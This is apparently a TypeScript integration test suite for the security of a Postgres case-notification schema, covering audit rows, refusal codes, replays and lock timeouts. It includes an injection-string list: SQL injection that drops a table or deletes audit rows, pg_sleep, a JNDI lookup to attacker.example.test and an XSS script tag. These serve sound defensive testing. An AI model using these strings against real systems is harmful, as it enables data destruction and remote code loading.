// V13-SEC-002 · SEC-DB-08, -09, -10, -11, -14 (injection as data), -15, -17, -25 (lock wait) · threats TM-T2, TM-T4,
// TM-T5, TM-T7, TM-R1, TM-R2, TM-I2, TM-D2.
// Every state-changing api_* command (a coverage guard fails when a new one is not listed) is driven through:
//  - one success, which writes exactly one audit row carrying the verified claims' actor, workspace and correlation
//    id, and leaves the chain valid;
//  - refusals (unknown id, another case's or a hidden object, the restricted case from a workspace member, the closed
//    case, a stale version, a replayed key, injection strings in every text argument), each of which changes nothing
//    and, since migration 0013 (V13-DB-021), writes exactly one COMMAND_REFUSED audit row with codes only: no id for
//    V1401/V1404, the target and its case for V1409/V1422/V1423 on a case the caller can access;
//  - unknown and unauthorised give the same code, the same (absent) message and the same audit row.
// The audit ledger is unreadable for the request role, so each case runs on the administrator connection: the
// request context is set exactly as withRequestContext sets it, the command runs as cdf_v13_user, then the role is
// reset to read the ledger in the same transaction, which is always rolled back.
// SYNTHETIC DATA ONLY.
import type postgres from "postgres";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { claimsMac, type Tx } from "@/lib/db/security-context";
import { TEST_CLAIMS_KEY } from "../../integration/support/claims";
import {
  adminClient,
  appClient,
  asRaw,
  attempt,
  CASE,
  claimsText,
  CLOSED_CASE,
  CORRELATION,
  databaseReady,
  installTestKey,
  PERSONA,
  RESTRICTED_CASE,
  TASK,
  TEMPLATE_VERSION,
  UNKNOWN_CASE,
  UNKNOWN_TASK,
  WORKSPACE,
  type Outcome,
} from "./support";

const present = await databaseReady("commands");

const KEY = (n: number) => n.toString(16).padStart(64, "c");

class Rollback extends Error {}

interface Run {
  outcome: Outcome;
  audit: {
    action: string;
    outcome: string;
    entity: string | null;
    metadata: Record<string, unknown>;
    actor: string | null;
    workspace: string | null;
    correlation: string | null;
    case_id: string | null;
  }[];
  chainValid: boolean;
  /** Row counts of the tables a command may write, after the call, minus before. */
  delta: Record<string, number>;
}

const WRITABLE = ["task", "procedural_event", "notification", "notification_event", "audit_event"] as const;

/** Runs `call` as cdf_v13_user under a verified context for persona/workspace, then inspects the ledger; rolls back. */
async function runAs(
  admin: postgres.Sql,
  persona: string | null,
  workspaceId: string,
  call: (tx: Tx) => Promise<unknown>,
): Promise<Run> {
  let result: Run | undefined;
  await admin
    .begin(async (tx) => {
      const counts = async () => {
        const out: Record<string, number> = {};
        for (const t of WRITABLE) {
          const [r] = await tx<
            { n: number }[]
          >`select count(*)::int as n from cdf_notifications_v13.${tx(t)}`;
          out[t] = r!.n;
        }
        return out;
      };
      // Since 0013 a refusal writes one row per (persona or none, command, code) per 60 s window; clear the windows
      // (rolled back with the rest) so an earlier suite's refusal does not suppress the row this run inspects.
      await tx`delete from cdf_notifications_v13.refusal_window`;
      const before = await counts();
      const [seqRow] = await tx<{ seq: string }[]>`
        select coalesce(max(seq), 0)::text as seq from cdf_notifications_v13.audit_event`;
      const seq = seqRow!.seq;
      if (persona) {
        const claims = claimsText(persona, workspaceId);
        const [xidRow] = await tx<{ xid: string }[]>`select pg_catalog.pg_current_xact_id()::text as xid`;
        const xid = xidRow!.xid;
        await tx`select pg_catalog.set_config('request.v13.claims', ${claims}, true),
                        pg_catalog.set_config('request.v13.claims_mac', ${claimsMac(TEST_CLAIMS_KEY, claims, xid)}, true)`;
      }
      await tx`select pg_catalog.set_config('role', 'cdf_v13_user', true)`;
      const outcome = await attempt(tx as unknown as Tx, call);
      await tx.unsafe("reset role");
      const audit = await tx<Run["audit"]>`
        select action, outcome, entity_id::text as entity, metadata, actor_persona_id::text as actor,
               workspace_id::text as workspace,
               correlation_id::text as correlation, case_id::text as case_id
          from cdf_notifications_v13.audit_event where seq > ${seq}::bigint order by seq`;
      const [validRow] = await tx<{ valid: boolean }[]>`
        select is_valid as valid from cdf_notifications_v13.verify_audit_chain()`;
      const valid = validRow!.valid;
      const after = await counts();
      const delta: Record<string, number> = {};
      for (const t of WRITABLE) if (after[t] !== before[t]) delta[t] = after[t]! - before[t]!;
      result = { outcome, audit: [...audit], chainValid: valid, delta };
      throw new Rollback();
    })
    .catch((e: unknown) => {
      if (!(e instanceof Rollback)) throw e;
    });
  return result!;
}

const update = (task: string, status: string, version: number | null) => (tx: Tx) =>
  tx`select * from cdf_notifications_v13.api_update_task_status(${task}, ${status}, ${version})`;
const draft =
  (caseId: string, recipient: string, key: string, tv = TEMPLATE_VERSION(1)) =>
  (tx: Tx) =>
    tx`select * from cdf_notifications_v13.api_create_notification_draft(${caseId}, ${tv}, ${recipient}, ${key})`;
const switchTo = (ws: string) => (tx: Tx) =>
  tx`select * from cdf_notifications_v13.api_switch_workspace(${ws})`;
const UPD = "api_update_task_status";
const DRF = "api_create_notification_draft";
const SWT = "api_switch_workspace";

/** Strings an attacker would put in a text argument. Each must be refused as invalid input and stored nowhere. */
const INJECTIONS = [
  "'; drop table cdf_notifications_v13.task; --",
  "BLOCKED'); delete from cdf_notifications_v13.audit_event; --",
  "$$; select pg_sleep(5); $$",
  "CASE_TEAM' or '1'='1",
  "CASE_TEAM‮",
  " CASE_TEAM",
  "case_team",
  "x".repeat(10_000),
  "${jndi:ldap://attacker.example.test/a}",
  "<script>alert(1)</script>",
];

describe.skipIf(!present)("SEC-DB-08..17 state-changing commands", () => {
  let admin: postgres.Sql;
  let app: postgres.Sql;

  beforeAll(async () => {
    admin = adminClient();
    app = appClient();
    await installTestKey(app);
  });
  afterAll(async () => {
    await admin?.end({ timeout: 5 });
    await app?.end({ timeout: 5 });
  });

  it("SEC-DB-17 coverage guard: the api_* commands are exactly the ones this suite drives", async () => {
    const rows = await admin<{ name: string }[]>`
      select p.proname as name from pg_catalog.pg_proc p join pg_catalog.pg_namespace n on n.oid = p.pronamespace
       where n.nspname = 'cdf_notifications_v13' and p.proname like 'api\\_%' order by 1`;
    // api_install_claims_key is covered by identity-claims.spec.ts (first writer wins, audited once, ids only).
    // api_record_access (0015) records a read, not a state change; tests/integration/case-access-audit.spec.ts covers it
    // and context-forgery.spec.ts its hostile contexts.
    expect(rows.map((r) => r.name)).toEqual([
      "api_create_notification_draft",
      "api_install_claims_key",
      "api_record_access",
      "api_switch_workspace",
      "api_update_task_status",
    ]);
  });

  describe("SEC-DB-17 a success writes exactly one audit row with the verified claims' identity", () => {
    const cases = [
      {
        label: "api_update_task_status (Beta, own task 1 in 0001)",
        persona: PERSONA.beta,
        ws: WORKSPACE.INVESTIGATIONS,
        call: update(TASK(1), "BLOCKED", 1),
        action: "TASK_STATUS_CHANGED",
        caseId: CASE(1),
        delta: { procedural_event: 1, audit_event: 1 },
      },
      {
        label: "api_create_notification_draft (Alpha, 0001)",
        persona: PERSONA.alpha,
        ws: WORKSPACE.SECRETARIAT,
        call: draft(CASE(1), "CASE_TEAM", KEY(1)),
        action: "NOTIFICATION_DRAFT_CREATED",
        caseId: CASE(1),
        delta: { notification: 1, notification_event: 1, audit_event: 1 },
      },
      {
        label: "api_switch_workspace (Delta, to Governance)",
        persona: PERSONA.delta,
        ws: WORKSPACE.SECRETARIAT,
        call: switchTo(WORKSPACE.GOVERNANCE),
        action: "WORKSPACE_SWITCHED",
        caseId: null,
        delta: { audit_event: 1 },
      },
    ];
    for (const c of cases) {
      it(c.label, async () => {
        const run = await runAs(admin, c.persona, c.ws, c.call);
        expect(run.outcome.ok).toBe(true);
        expect(run.audit).toEqual([
          {
            action: c.action,
            outcome: "SUCCEEDED",
            entity: expect.any(String),
            metadata: expect.any(Object),
            actor: c.persona,
            workspace: c.ws,
            correlation: CORRELATION,
            case_id: c.caseId,
          },
        ]);
        expect(run.chainValid).toBe(true);
        expect(run.delta).toEqual(c.delta);
      });
    }
  });

  describe("SEC-DB-08/10/11/15 refusals change nothing and write one ids-only COMMAND_REFUSED row", () => {
    /** [label, persona, workspace, call, code, command, case and entity on the row (only for an accessible case)]. */
    const refusals: [
      string,
      string | null,
      string,
      (tx: Tx) => Promise<unknown>,
      string,
      string,
      { caseId: string; entity: string | null } | null,
    ][] = [
      [
        "no context: update",
        null,
        WORKSPACE.SECRETARIAT,
        update(TASK(2), "IN_PROGRESS", 1),
        "V1401",
        UPD,
        null,
      ],
      [
        "no context: draft",
        null,
        WORKSPACE.SECRETARIAT,
        draft(CASE(1), "CASE_TEAM", KEY(2)),
        "V1401",
        DRF,
        null,
      ],
      [
        "no context: switch",
        null,
        WORKSPACE.SECRETARIAT,
        switchTo(WORKSPACE.SECRETARIAT),
        "V1401",
        SWT,
        null,
      ],
      [
        "unknown task",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        update(UNKNOWN_TASK, "IN_PROGRESS", 1),
        "V1404",
        UPD,
        null,
      ],
      // SEC-DB-08: another case's object. Alpha's own context; task 3 belongs to 0002, which Alpha cannot see.
      [
        "task of a hidden case (0002)",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        update(TASK(3), "IN_PROGRESS", 1),
        "V1404",
        UPD,
        null,
      ],
      // SEC-DB-11: restricted case from a member of its owning workspace who is not assigned.
      [
        "restricted task 17 (Gamma, Investigations)",
        PERSONA.gamma,
        WORKSPACE.INVESTIGATIONS,
        update(TASK(17), "IN_PROGRESS", 1),
        "V1404",
        UPD,
        null,
      ],
      [
        "restricted case draft (Gamma)",
        PERSONA.gamma,
        WORKSPACE.INVESTIGATIONS,
        draft(RESTRICTED_CASE, "CASE_TEAM", KEY(3)),
        "V1404",
        DRF,
        null,
      ],
      [
        "restricted case draft (Alpha, visible workspace, not assigned)",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        draft(RESTRICTED_CASE, "CASE_TEAM", KEY(4)),
        "V1404",
        DRF,
        null,
      ],
      // SEC-DB-10: closed case, for a persona who can see it.
      [
        "closed case draft (Alpha)",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        draft(CLOSED_CASE, "CASE_TEAM", KEY(5)),
        "V1423",
        DRF,
        { caseId: CLOSED_CASE, entity: null },
      ],
      // SEC-DB-09: stale version.
      [
        "stale version",
        PERSONA.beta,
        WORKSPACE.INVESTIGATIONS,
        update(TASK(1), "BLOCKED", 2),
        "V1409",
        UPD,
        { caseId: CASE(1), entity: TASK(1) },
      ],
      [
        "null version",
        PERSONA.beta,
        WORKSPACE.INVESTIGATIONS,
        update(TASK(1), "BLOCKED", null),
        "V1409",
        UPD,
        { caseId: CASE(1), entity: TASK(1) },
      ],
      // Wrong role for a draft (Governance only): the role check answers V1404, so no id either.
      [
        "draft by Governance Delta",
        PERSONA.delta,
        WORKSPACE.GOVERNANCE,
        draft(CASE(8), "CASE_TEAM", KEY(6)),
        "V1404",
        DRF,
        null,
      ],
      [
        "switch to a non-member workspace",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        switchTo(WORKSPACE.INVESTIGATIONS),
        "V1404",
        SWT,
        null,
      ],
      [
        "inactive template version or unknown one",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        draft(CASE(1), "CASE_TEAM", KEY(7), "1f000000-0000-4000-8000-0000000000ff"),
        "V1422",
        DRF,
        { caseId: CASE(1), entity: null },
      ],
      [
        "closed case, own task 19 (Alpha)",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        update(TASK(19), "OPEN", 1),
        "V1423",
        UPD,
        { caseId: CLOSED_CASE, entity: TASK(19) },
      ],
    ];
    for (const [label, persona, ws, call, code, command, target] of refusals) {
      it(`${label}: ${code}`, async () => {
        const run = await runAs(admin, persona, ws, call);
        expect({ ok: run.outcome.ok, code: run.outcome.code }).toEqual({ ok: false, code });
        expect(run.outcome.message).toBeUndefined();
        expect(run.audit).toEqual([
          {
            action: "COMMAND_REFUSED",
            outcome: "REFUSED",
            entity: target?.entity ?? null,
            metadata: { command, refusal: code },
            actor: persona,
            workspace: persona ? ws : null,
            correlation: persona ? CORRELATION : null,
            case_id: target?.caseId ?? null,
          },
        ]);
        expect(run.chainValid).toBe(true);
        expect(run.delta).toEqual({ audit_event: 1 });
      });
    }
  });

  describe("SEC-DB-19 unknown and unauthorised give the same code, the same message and the same audit row", () => {
    const pairs: [string, string, string, (tx: Tx) => Promise<unknown>, (tx: Tx) => Promise<unknown>][] = [
      [
        "update: hidden task vs unknown task",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        update(TASK(17), "IN_PROGRESS", 1),
        update(UNKNOWN_TASK, "IN_PROGRESS", 1),
      ],
      [
        "draft: restricted case vs unknown case",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        draft(RESTRICTED_CASE, "CASE_TEAM", KEY(8)),
        draft(UNKNOWN_CASE, "CASE_TEAM", KEY(8)),
      ],
      [
        "draft: other-workspace case vs unknown case",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        draft(CASE(2), "CASE_TEAM", KEY(9)),
        draft(UNKNOWN_CASE, "CASE_TEAM", KEY(9)),
      ],
      [
        "switch: non-member workspace vs unknown workspace",
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        switchTo(WORKSPACE.GOVERNANCE),
        switchTo("0a000000-0000-4000-8000-0000000000ff"),
      ],
    ];
    for (const [label, persona, ws, hidden, unknown] of pairs) {
      it(label, async () => {
        const a = await runAs(admin, persona, ws, hidden);
        const b = await runAs(admin, persona, ws, unknown);
        expect(a.outcome.ok).toBe(false);
        expect({ code: a.outcome.code, message: a.outcome.message }).toEqual({
          code: b.outcome.code,
          message: b.outcome.message,
        });
        // V13-DB-021 §4.1: the two REFUSED rows are identical (no id), apart from seq, time and hashes.
        expect(a.audit).toHaveLength(1);
        expect(a.audit).toEqual(b.audit);
      });
    }
  });

  describe("SEC-DB-14 injection strings in every text argument are refused as input and stored nowhere", () => {
    // Since 0013 the refusal leaves one COMMAND_REFUSED row whose metadata holds two allow-listed codes only.
    const storedNowhere = (run: Run, s: string) => {
      expect(run.delta, s.slice(0, 30)).toEqual({ audit_event: 1 });
      expect(JSON.stringify(run.audit), s.slice(0, 30)).not.toContain(s);
      expect(run.audit[0]?.metadata).toEqual({ command: expect.any(String), refusal: "V1422" });
    };
    it("api_update_task_status p_new_status", async () => {
      for (const s of INJECTIONS) {
        const run = await runAs(admin, PERSONA.beta, WORKSPACE.INVESTIGATIONS, update(TASK(1), s, 1));
        expect(run.outcome.code, s.slice(0, 30)).toBe("V1422");
        storedNowhere(run, s);
      }
    });
    it("api_create_notification_draft p_recipient_class and p_idempotency_key", async () => {
      for (const s of INJECTIONS) {
        const a = await runAs(admin, PERSONA.alpha, WORKSPACE.SECRETARIAT, draft(CASE(1), s, KEY(10)));
        expect(a.outcome.code, s.slice(0, 30)).toBe("V1422");
        storedNowhere(a, s);
        const b = await runAs(admin, PERSONA.alpha, WORKSPACE.SECRETARIAT, draft(CASE(1), "CASE_TEAM", s));
        expect(b.outcome.code, s.slice(0, 30)).toBe("V1422");
        storedNowhere(b, s);
      }
    });
    it("a NUL byte is refused by the driver or the server, never stored", async () => {
      const run = await runAs(
        admin,
        PERSONA.alpha,
        WORKSPACE.SECRETARIAT,
        draft(CASE(1), "CASE_TEAM\u0000", KEY(11)),
      );
      expect(run.outcome.ok).toBe(false);
      // Refused by the driver (nothing sent) or as input (V1422, one codes-only row); no notification either way.
      expect(run.delta.notification ?? 0).toBe(0);
      expect(JSON.stringify(run.audit)).not.toContain("\\u0000");
    });
  });

  // Since 0013 a transaction runs one command (V13-DB-021 R1): a second call is refused V1500 (tests/integration/
  // refused-command-audit.spec.ts). The replay is therefore a first write by the command's body (_impl, as the
  // administrator under the same verified claims), then the command; everything is rolled back.
  describe("SEC-DB-09 / SEC-DB-15 replays", () => {
    const viaImpl = (sql: (tx: Tx) => Promise<unknown>) => async (tx: Tx) => {
      await tx`reset role`;
      await sql(tx);
      await tx`select pg_catalog.set_config('role', 'cdf_v13_user', true)`;
    };
    it("the same expected version twice: the second update is stale (V1409)", async () => {
      const run = await runAs(admin, PERSONA.beta, WORKSPACE.INVESTIGATIONS, async (tx) => {
        await viaImpl(
          (t) =>
            t`select * from cdf_notifications_v13._api_update_task_status_impl(${TASK(1)}, 'BLOCKED', 1)`,
        )(tx);
        return update(TASK(1), "IN_PROGRESS", 1)(tx);
      });
      expect(run.outcome.code).toBe("V1409");
      expect(run.audit.map((r) => [r.action, r.outcome])).toEqual([
        ["TASK_STATUS_CHANGED", "SUCCEEDED"],
        ["COMMAND_REFUSED", "REFUSED"],
      ]);
    });
    it("the same idempotency key twice by the same author: V1409, and the key under another case does not create", async () => {
      const run = await runAs(admin, PERSONA.alpha, WORKSPACE.SECRETARIAT, async (tx) => {
        await viaImpl(
          (t) =>
            t`select * from cdf_notifications_v13._api_create_notification_draft_impl(
                ${CASE(1)}, ${TEMPLATE_VERSION(1)}, 'CASE_TEAM', ${KEY(12)})`,
        )(tx);
        return draft(CASE(3), "CASE_TEAM", KEY(12))(tx);
      });
      expect(run.outcome.code).toBe("V1409");
      expect(run.delta).toEqual({ notification: 1, notification_event: 1, audit_event: 2 });
    });
  });

  it("SEC-DB-25 a held task lock makes a second caller fail at lock_timeout instead of hanging", async () => {
    const other = appClient();
    try {
      let waited = 0;
      let second: Outcome | undefined;
      await asRaw(
        app,
        { claims: claimsText(PERSONA.beta, WORKSPACE.INVESTIGATIONS), mac: "valid" },
        async (tx) => {
          await update(TASK(1), "BLOCKED", 1)(tx); // holds the row lock until rollback
          const started = Date.now();
          second = await asRaw(
            other,
            { claims: claimsText(PERSONA.beta, WORKSPACE.INVESTIGATIONS), mac: "valid" },
            (tx2) => attempt(tx2, update(TASK(1), "BLOCKED", 1)),
          );
          waited = Date.now() - started;
        },
      );
      expect(second?.code).toBe("55P03"); // lock_not_available (cdf_v13_app lock_timeout = 3s)
      expect(waited).toBeLessThan(6_000);
    } finally {
      await other.end({ timeout: 5 });
    }
  }, 20_000);
});
